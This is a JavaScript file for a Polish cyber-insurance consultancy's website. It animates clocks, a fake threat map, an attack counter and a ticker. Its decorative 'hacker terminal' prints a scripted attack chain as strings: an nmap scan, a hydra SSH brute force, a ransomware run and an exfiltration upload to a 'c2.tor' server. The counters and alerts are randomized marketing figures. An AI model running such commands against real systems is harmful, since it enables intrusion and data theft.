/* ════════════════════════════════════════════════
   AURA CONSULTING · CYBER · app.js
   ════════════════════════════════════════════════ */

/* ── ATTACK COUNTER ─────────────────────────── */
(function () {
  const el = document.getElementById('hero-counter');
  if (!el) return;
  const now = new Date();
  const sod = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  let n = Math.floor((now - sod) / 1000 * 1.85);
  el.textContent = n.toLocaleString('pl-PL');
  setInterval(() => {
    n += Math.floor(Math.random() * 3) + 1;
    el.textContent = n.toLocaleString('pl-PL');
  }, 950);
})();

/* ── SPLIT-FLAP CLOCKS (no seconds) ────────── */
(function () {
  const ZONES = [
    { id: 'tok', tz: 'Asia/Tokyo',       alerts: ['RANSOMWARE · 14 ATAKÓW/H', 'APT41 · AKTYWNOŚĆ', 'PHISHING · SEKTOR BANKOWY', 'BOTNET · 2.3K WĘZŁÓW'],    danger: true  },
    { id: 'lon', tz: 'Europe/London',    alerts: ['LLOYD\'S · OCHRONA AKTYWNA', 'CFC UNDERWRITING · UP', 'CYBER PATROL · NOMINAL', 'REINSURANCE LAYER · ON'], danger: false },
    { id: 'waw', tz: 'Europe/Warsaw',    alerts: ['AURA SHIELD · AKTYWNA', 'CERT.PL · ALERT LVL 2', 'NIS2 · COMPLIANCE OK', 'UODO · MONITORING ON'],         danger: false },
    { id: 'nyc', tz: 'America/New_York', alerts: ['RANSOMHUB · 8 KAMPANII', 'FIN7 · SEKTOR RETAIL', 'BEC FRAUD · $2.1M/DOBĘ', 'DARKNET · AUKCJE DANYCH'],   danger: true  },
  ];

  const idx = {};
  ZONES.forEach(z => idx[z.id] = 0);

  function pad2(n) { return String(n).padStart(2, '0'); }

  function setFlap(id, ch) {
    const el = document.getElementById(id);
    if (!el || el.textContent === ch) return;
    el.textContent = ch;
    el.classList.remove('flip');
    void el.offsetWidth;
    el.classList.add('flip');
  }

  function tick() {
    ZONES.forEach(z => {
      const parts = new Intl.DateTimeFormat('en-GB', {
        timeZone: z.tz, hour: '2-digit', minute: '2-digit', hour12: false
      }).formatToParts(new Date());
      const tp = {};
      parts.forEach(p => tp[p.type] = p.value);
      const h = pad2(parseInt(tp.hour || 0));
      const m = pad2(parseInt(tp.minute || 0));
      setFlap(z.id + '-h0', h[0]);
      setFlap(z.id + '-h1', h[1]);
      setFlap(z.id + '-m0', m[0]);
      setFlap(z.id + '-m1', m[1]);

      const d = document.getElementById(z.id + '-date');
      if (d) d.textContent = new Intl.DateTimeFormat('en-GB', {
        timeZone: z.tz, weekday: 'short', day: '2-digit', month: 'short'
      }).format(new Date()).toUpperCase();
    });
  }

  function rotateAlerts() {
    ZONES.forEach(z => {
      const el = document.getElementById(z.id + '-alert');
      if (!el) return;
      el.style.opacity = '0';
      setTimeout(() => {
        el.textContent = z.alerts[idx[z.id]];
        el.style.opacity = '1';
        idx[z.id] = (idx[z.id] + 1) % z.alerts.length;
      }, 280);
    });
  }

  tick();
  rotateAlerts();
  setInterval(tick, 15000);
  setInterval(rotateAlerts, 4000);
})();

/* ── HACKER TERMINAL ────────────────────────── */
(function () {
  const linesEl   = document.getElementById('term-lines');
  const typingEl  = document.getElementById('term-typing');
  if (!linesEl || !typingEl) return;

  const SCRIPT = [
    { type: 'cmd',   text: 'nmap -sS -O 192.168.1.0/24 --open' },
    { type: 'out',   text: 'Starting Nmap 7.94 ( https://nmap.org )' },
    { type: 'out',   text: 'Scanning 256 hosts [1 port/host]...' },
    { type: 'ok',    text: 'Host 192.168.1.14 is up (0.0021s latency)' },
    { type: 'ok',    text: 'Host 192.168.1.23 is up (0.0034s latency)' },
    { type: 'warn',  text: 'Open ports: 22/tcp  80/tcp  443/tcp  3389/tcp' },
    { type: 'blank' },
    { type: 'cmd',   text: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.14' },
    { type: 'out',   text: '[DATA] attacking ssh://192.168.1.14:22/' },
    { type: 'out',   text: '[22][ssh] host: 192.168.1.14  login: admin' },
    { type: 'ok',    text: 'password: S3cur3P@ss2019  ← MATCH FOUND' },
    { type: 'blank' },
    { type: 'cmd',   text: 'ssh admin@192.168.1.14' },
    { type: 'out',   text: 'Warning: Permanently added host to known hosts.' },
    { type: 'data',  text: 'admin@target-server:~$ ' },
    { type: 'blank' },
    { type: 'cmd',   text: 'find / -name "*.sql" -o -name "customers*.csv" 2>/dev/null' },
    { type: 'err',   text: '/var/www/html/backup/customers_2024_Q3.csv' },
    { type: 'err',   text: '/var/lib/mysql/orders_dump.sql  [48.2 MB]' },
    { type: 'blank' },
    { type: 'cmd',   text: 'python3 ransomware.py --target /var/www --encrypt AES256' },
    { type: 'warn',  text: '[!] Encrypting... /var/www/html  ████████████  100%' },
    { type: 'err',   text: '[✓] 2,341 files encrypted. Key: 7f3a9b2c1d...' },
    { type: 'err',   text: 'README_DECRYPT.txt written to all directories.' },
    { type: 'blank' },
    { type: 'cmd',   text: 'exfil.sh --upload customers_2024_Q3.csv --server c2.tor' },
    { type: 'ok',    text: 'Upload complete. 430,182 records transferred.' },
    { type: 'blank' },
    { type: 'out',   text: '>>> Aura Consulting cyber policy would have covered:' },
    { type: 'ok',    text: '    ✓ Ransom negotiation & payment up to policy limit' },
    { type: 'ok',    text: '    ✓ Forensic investigation & incident response' },
    { type: 'ok',    text: '    ✓ RODO breach notification (72h deadline)' },
    { type: 'ok',    text: '    ✓ Business interruption loss recovery' },
    { type: 'ok',    text: '    ✓ Legal defence & regulatory fines (NIS2)' },
  ];

  let lineIdx = 0;
  let charIdx = 0;
  let phase   = 'typing'; // typing | pause | newline

  function addLine(type, text) {
    const div = document.createElement('div');
    div.className = 'tl-' + type;
    if (type === 'blank') { div.style.height = '0.5em'; }
    else { div.textContent = text; }
    linesEl.appendChild(div);
    // keep last ~18 lines visible
    while (linesEl.children.length > 18) linesEl.removeChild(linesEl.firstChild);
  }

  function loop() {
    if (lineIdx >= SCRIPT.length) { lineIdx = 0; linesEl.innerHTML = ''; }

    const entry = SCRIPT[lineIdx];

    if (entry.type === 'blank') {
      addLine('blank', '');
      lineIdx++;
      setTimeout(loop, 120);
      return;
    }

    if (entry.type !== 'cmd') {
      // output lines appear instantly
      addLine(entry.type, entry.text);
      lineIdx++;
      setTimeout(loop, 80 + Math.random() * 120);
      return;
    }

    // CMD: type character by character
    if (charIdx === 0) typingEl.textContent = '';

    if (charIdx < entry.text.length) {
      typingEl.textContent += entry.text[charIdx];
      charIdx++;
      setTimeout(loop, 40 + Math.random() * 60);
    } else {
      // finished typing — commit line
      addLine('cmd', entry.text);
      typingEl.textContent = '';
      charIdx = 0;
      lineIdx++;
      setTimeout(loop, 400 + Math.random() * 200);
    }
  }

  setTimeout(loop, 800);
})();

/* ── TICKER ─────────────────────────────────── */
(function () {
  const el = document.getElementById('ticker');
  if (!el) return;

  const items = [
    { red: true,  text: 'RANSOMWARE · Atak na sieć szpitala · Niemcy · 3 tygodnie przestoju' },
    { red: false, text: 'PHISHING · Utrata 2,1M EUR · Firma logistyczna · Polska 2024' },
    { red: true,  text: 'DATA BREACH · 430 000 rekordów klientów · Retailer · Czechy' },
    { red: false, text: 'BEC FRAUD · CEO Scam · Straty 890K PLN · Warszawa · Q3 2024' },
    { red: true,  text: 'SUPPLY CHAIN · Kompromitacja SaaS · 140 firm dotkniętych jednocześnie' },
    { red: false, text: 'DDoS · 48h przestoju · E-commerce · Black Friday 2023' },
    { red: true,  text: 'RANSOMWARE · Kancelaria prawna · 3TB zaszyfrowanych danych klientów' },
    { red: false, text: 'INSIDER THREAT · Wyciek bazy klientów · Sektor finansowy · Kraków' },
    { red: true,  text: 'CRYPTOJACKING · Infrastruktura chmurowa · 220K EUR strat energetycznych' },
    { red: false, text: 'KARA RODO · UODO · 1,1M PLN nałożone na administratora danych osobowych' },
    { red: true,  text: 'APT41 · Atak na infrastrukturę krytyczną · Europa Środkowa 2024' },
    { red: false, text: 'NIS2 · Nowe wymogi bezpieczeństwa dla operatorów usług kluczowych' },
  ];

  const doubled = [...items, ...items];
  el.innerHTML = doubled.map(it =>
    `<span class="tick-item"><span class="tick-dot ${it.red ? 'red' : 'blue'}"></span>${it.text}</span>`
  ).join('');
})();

/* ── THREAT MAP ─────────────────────────────── */
(function () {
  const cv = document.getElementById('threat-canvas');
  if (!cv) return;
  const ctx = cv.getContext('2d');

  function resize() {
    const wrap = cv.parentElement;
    cv.width  = wrap.clientWidth;
    cv.height = Math.max(380, Math.round(wrap.clientWidth * 0.46));
    buildPositions();
  }

  // Mercator
  function project(lon, lat) {
    const x = ((lon + 180) / 360) * cv.width;
    const lr = lat * Math.PI / 180;
    const y  = cv.height / 2 - (cv.width * Math.log(Math.tan(Math.PI / 4 + lr / 2)) / (2 * Math.PI));
    return { x, y };
  }

  // Simplified land polygons [lon, lat]
  const POLYS = [
    // N America
    [[-168,71],[-140,70],[-132,56],[-124,49],[-94,49],[-83,46],[-76,44],[-66,45],[-65,43],[-70,41],[-75,35],[-80,25],[-85,21],[-91,16],[-87,15],[-83,10],[-77,8],[-80,25],[-90,20],[-95,19],[-97,22],[-105,23],[-110,24],[-117,32],[-120,34],[-124,37],[-124,49],[-130,55],[-140,60],[-155,60],[-165,61],[-168,71]],
    // Greenland
    [[-45,83],[-20,83],[-18,77],[-25,70],[-44,65],[-52,67],[-55,76],[-45,83]],
    // S America
    [[-82,8],[-78,8],[-75,10],[-63,12],[-60,8],[-52,5],[-50,1],[-50,-5],[-40,-15],[-38,-10],[-35,-8],[-35,-12],[-40,-20],[-45,-23],[-49,-26],[-53,-33],[-58,-38],[-62,-42],[-65,-46],[-66,-52],[-70,-55],[-73,-52],[-72,-46],[-70,-40],[-72,-35],[-72,-30],[-70,-18],[-75,-12],[-77,-8],[-82,0],[-80,5],[-82,8]],
    // Europe
    [[28,70],[32,65],[28,62],[22,60],[18,60],[14,56],[10,56],[8,58],[5,58],[3,51],[2,51],[-2,48],[-5,48],[-5,44],[0,44],[3,43],[6,44],[8,44],[12,44],[14,46],[16,48],[18,48],[20,50],[22,52],[24,56],[22,58],[25,60],[28,65],[28,70]],
    // Scandinavia
    [[28,71],[22,71],[18,68],[14,66],[8,62],[6,58],[8,56],[10,56],[12,58],[18,62],[22,68],[28,71]],
    // N Africa + Middle East
    [[-5,36],[0,36],[10,37],[12,36],[16,32],[24,30],[34,28],[42,12],[50,12],[50,5],[42,0],[36,-5],[34,-10],[36,-20],[38,-25],[34,-30],[28,-34],[20,-35],[14,-30],[12,-18],[10,-5],[8,4],[10,10],[16,12],[24,12],[32,12],[38,12],[42,18],[46,38],[50,38],[56,28],[56,20],[44,14],[42,12],[36,16],[32,20],[26,32],[26,36],[-5,36]],
    // South Asia
    [[56,28],[60,22],[68,24],[74,24],[80,28],[86,28],[88,26],[90,22],[92,20],[86,14],[80,10],[76,8],[74,20],[68,20],[60,22],[56,28]],
    // East Asia + SE
    [[88,26],[92,26],[100,26],[108,20],[110,18],[120,18],[124,24],[128,34],[132,36],[136,34],[140,36],[140,40],[132,42],[128,50],[122,50],[116,50],[110,44],[104,40],[100,36],[96,36],[88,34],[88,26]],
    // Japan
    [[130,32],[132,34],[136,36],[138,38],[140,40],[142,43],[138,44],[136,42],[132,38],[130,34],[130,32]],
    // Australia
    [[114,-22],[122,-18],[130,-12],[136,-12],[140,-18],[148,-20],[152,-24],[152,-30],[148,-38],[142,-38],[136,-36],[130,-32],[118,-28],[114,-22]],
    // Russia
    [[28,70],[40,68],[52,68],[60,68],[70,68],[80,68],[90,68],[100,68],[110,68],[120,68],[136,68],[140,60],[136,54],[130,50],[120,48],[110,50],[100,52],[90,52],[80,50],[70,54],[60,56],[50,52],[40,50],[36,46],[30,44],[28,46],[26,50],[28,60],[28,70]],
  ];

  const GEO = [
    { name:'WARSAW',      lon:21.0,  lat:52.2,  target:true  },
    { name:'LONDON',      lon:-0.1,  lat:51.5,  target:true  },
    { name:'FRANKFURT',   lon:8.7,   lat:50.1,  target:true  },
    { name:'AMSTERDAM',   lon:4.9,   lat:52.4,  target:true  },
    { name:'PARIS',       lon:2.3,   lat:48.9,  target:true  },
    { name:'TOKYO',       lon:139.7, lat:35.7,  target:false },
    { name:'BEIJING',     lon:116.4, lat:39.9,  target:false },
    { name:'SEOUL',       lon:126.9, lat:37.6,  target:false },
    { name:'MOSCOW',      lon:37.6,  lat:55.8,  target:false },
    { name:'KYIV',        lon:30.5,  lat:50.5,  target:false },
    { name:'NEW YORK',    lon:-74.0, lat:40.7,  target:false },
    { name:'CHICAGO',     lon:-87.6, lat:41.9,  target:false },
    { name:'LOS ANGELES', lon:-118.2,lat:34.0,  target:false },
    { name:'SINGAPORE',   lon:103.8, lat:1.4,   target:false },
    { name:'MUMBAI',      lon:72.8,  lat:19.1,  target:false },
    { name:'SAO PAULO',   lon:-46.6, lat:-23.5, target:false },
    { name:'DUBAI',       lon:55.3,  lat:25.2,  target:false },
    { name:'TORONTO',     lon:-79.4, lat:43.7,  target:false },
    { name:'SYDNEY',      lon:151.2, lat:-33.9, target:false },
    { name:'JOHANNESBURG',lon:28.1,  lat:-26.2, target:false },
  ];

  let cities = [];

  function buildPositions() {
    cities = GEO.map(c => ({ ...c, ...project(c.lon, c.lat) }));
  }

  resize();
  window.addEventListener('resize', resize);

  // Particles
  const TYPES = [
    { name:'RANSOMWARE',   color:'#e83030', w:3 },
    { name:'PHISHING',     color:'#d97706', w:4 },
    { name:'DDoS',         color:'#1A8FCE', w:2 },
    { name:'BEC FRAUD',    color:'#e83030', w:2 },
    { name:'APT',          color:'#7c3aed', w:1 },
    { name:'SUPPLY CHAIN', color:'#d97706', w:1 },
  ];

  function pickType() {
    const pool = [];
    TYPES.forEach(t => { for (let i = 0; i < t.w; i++) pool.push(t); });
    return pool[Math.floor(Math.random() * pool.length)];
  }

  let particles = [];
  let totAtk = 0, totBlk = 0;
  const tCounts = {};
  TYPES.forEach(t => tCounts[t.name] = 0);

  function spawn() {
    const srcs = cities.filter(c => !c.target);
    const dsts = cities.filter(c =>  c.target);
    if (!srcs.length || !dsts.length) return;
    const src  = srcs[Math.floor(Math.random() * srcs.length)];
    const dst  = dsts[Math.floor(Math.random() * dsts.length)];
    const type = pickType();
    const blocked = Math.random() > 0.3;
    particles.push({ sx:src.x, sy:src.y, ex:dst.x, ey:dst.y, t:0, dur:100+Math.random()*50, color:type.color, type:type.name, src:src.name, dst:dst.name, blocked, trail:[], done:false });
    totAtk++;
    if (blocked) totBlk++;
    tCounts[type.name]++;
    addLog(src.name, dst.name, type, blocked);
    updateStats();
    renderBars();
  }

  function drawFrame() {
    const W = cv.width, H = cv.height;
    ctx.clearRect(0, 0, W, H);

    // Ocean
    ctx.fillStyle = '#040608';
    ctx.fillRect(0, 0, W, H);

    // Scanlines
    for (let y = 0; y < H; y += 4) {
      ctx.fillStyle = 'rgba(26,143,206,0.012)';
      ctx.fillRect(0, y, W, 1);
    }

    // Grid
    ctx.strokeStyle = 'rgba(26,143,206,0.06)';
    ctx.lineWidth   = 0.4;
    for (let lon = -180; lon <= 180; lon += 30) {
      ctx.beginPath();
      let first = true;
      for (let lat = -80; lat <= 80; lat += 4) {
        const p = project(lon, lat);
        first ? ctx.moveTo(p.x, p.y) : ctx.lineTo(p.x, p.y);
        first = false;
      }
      ctx.stroke();
    }
    for (let lat = -60; lat <= 80; lat += 30) {
      ctx.beginPath();
      let first = true;
      for (let lon = -180; lon <= 180; lon += 4) {
        const p = project(lon, lat);
        first ? ctx.moveTo(p.x, p.y) : ctx.lineTo(p.x, p.y);
        first = false;
      }
      ctx.stroke();
    }

    // Land
    POLYS.forEach(poly => {
      ctx.beginPath();
      poly.forEach(([lo, la], i) => {
        const p = project(lo, la);
        i === 0 ? ctx.moveTo(p.x, p.y) : ctx.lineTo(p.x, p.y);
      });
      ctx.closePath();
      ctx.fillStyle   = '#0d1525';
      ctx.strokeStyle = 'rgba(26,143,206,0.22)';
      ctx.lineWidth   = 0.6;
      ctx.fill();
      ctx.stroke();
    });

    // Cities
    const fontSize = Math.max(7, Math.round(W * 0.009));
    ctx.font = `${fontSize}px 'DM Mono', monospace`;

    cities.forEach(c => {
      if (c.target) {
        [14, 9, 5].forEach(r => {
          ctx.beginPath();
          ctx.arc(c.x, c.y, r, 0, Math.PI * 2);
          ctx.strokeStyle = `rgba(26,143,206,${0.55 - r * 0.02})`;
          ctx.lineWidth   = 0.7;
          ctx.stroke();
        });
        ctx.beginPath();
        ctx.arc(c.x, c.y, 3, 0, Math.PI * 2);
        ctx.fillStyle = '#1A8FCE';
        ctx.fill();
        ctx.fillStyle = 'rgba(26,143,206,0.8)';
      } else {
        ctx.beginPath();
        ctx.arc(c.x, c.y, 2, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(232,48,48,0.6)';
        ctx.fill();
        ctx.fillStyle = 'rgba(232,48,48,0.45)';
      }
      ctx.fillText(c.name, c.x + 5, c.y - 4);
    });

    // Particles
    particles = particles.filter(p => !p.done);
    particles.forEach(p => {
      p.t++;
      const prog = p.t / p.dur;
      if (prog >= 1) { p.done = true; return; }

      const mx = (p.sx + p.ex) / 2;
      const my = Math.min(p.sy, p.ey) - H * 0.17;
      const t  = prog, nt = 1 - t;

      const px = nt*nt*p.sx + 2*nt*t*mx + t*t*p.ex;
      const py = nt*nt*p.sy + 2*nt*t*my + t*t*p.ey;

      p.trail.push({ x: px, y: py });
      if (p.trail.length > 24) p.trail.shift();

      // Trail
      p.trail.forEach((pt, i) => {
        ctx.globalAlpha = (i / p.trail.length) * (1 - prog) * 0.6;
        ctx.fillStyle   = p.color;
        ctx.beginPath();
        ctx.arc(pt.x, pt.y, 1.3, 0, Math.PI * 2);
        ctx.fill();
      });

      // Head
      ctx.globalAlpha = 0.92;
      ctx.fillStyle   = p.color;
      ctx.beginPath();
      ctx.arc(px, py, 3, 0, Math.PI * 2);
      ctx.fill();
      ctx.globalAlpha = 1;

      // Impact
      if (p.t >= p.dur - 4) {
        if (p.blocked) {
          ctx.strokeStyle = '#1A8FCE';
          ctx.lineWidth   = 1.5;
          [4, 8, 13].forEach(r => {
            ctx.globalAlpha = (1 - r / 15) * 0.7;
            ctx.beginPath();
            ctx.arc(p.ex, p.ey, r, 0, Math.PI * 2);
            ctx.stroke();
          });
        } else {
          ctx.globalAlpha = 0.85;
          ctx.fillStyle   = '#e83030';
          ctx.beginPath();
          ctx.arc(p.ex, p.ey, 8, 0, Math.PI * 2);
          ctx.fill();
        }
        ctx.globalAlpha = 1;
      }
    });

    requestAnimationFrame(drawFrame);
  }

  drawFrame();
  setInterval(spawn, 1100);

  // Sidebar
  function addLog(src, dst, type, blocked) {
    const el = document.getElementById('attack-log');
    if (!el) return;
    const cls = type.color === '#e83030' ? 'red' : type.color === '#d97706' ? 'amber' : 'blue';
    const row = document.createElement('div');
    row.className = 'log-row';
    row.innerHTML = `<div class="log-dot ${cls}"></div><div class="log-txt"><strong>${src}</strong> → ${dst}<br>${type.name} · ${blocked ? 'ZABLOKOWANY' : 'TRAFIŁ'}</div>`;
    el.insertBefore(row, el.firstChild);
    while (el.children.length > 7) el.removeChild(el.lastChild);
  }

  function updateStats() {
    const s = (id, v) => { const e = document.getElementById(id); if (e) e.textContent = v; };
    s('ms-total',   totAtk);
    s('ms-blocked', totBlk);
    s('ms-active',  particles.length);
  }

  function renderBars() {
    const el = document.getElementById('type-bars');
    if (!el) return;
    const max = Math.max(1, ...Object.values(tCounts));
    el.innerHTML = '';
    TYPES.forEach(t => {
      const pct = Math.round((tCounts[t.name] || 0) / max * 100);
      const d = document.createElement('div');
      d.className = 'tb-row';
      d.innerHTML = `<div class="tb-top"><span style="color:${t.color}">${t.name}</span><span style="color:rgba(255,255,255,0.3)">${tCounts[t.name]}</span></div><div class="tb-bg"><div class="tb-fill" style="width:${pct}%;background:${t.color}"></div></div>`;
      el.appendChild(d);
    });
  }

  setInterval(() => {
    const el = document.getElementById('map-clock');
    if (el) el.textContent = new Date().toUTCString().slice(17, 25) + ' UTC';
  }, 1000);
  renderBars();
})();

/* ── CTA ────────────────────────────────────── */
function handleCTA() {
  const inp = document.getElementById('cta-email');
  if (!inp) return;
  const v = inp.value.trim();
  if (!v || !v.includes('@')) {
    inp.style.borderColor = '#e83030';
    setTimeout(() => inp.style.borderColor = '', 1500);
    return;
  }
  inp.value = '';
  inp.placeholder = 'Dziękujemy! Odezwiemy się w 24h.';
  inp.style.borderColor = '#1A8FCE';
  setTimeout(() => { inp.placeholder = 'twoj@email.pl'; inp.style.borderColor = ''; }, 5000);
}
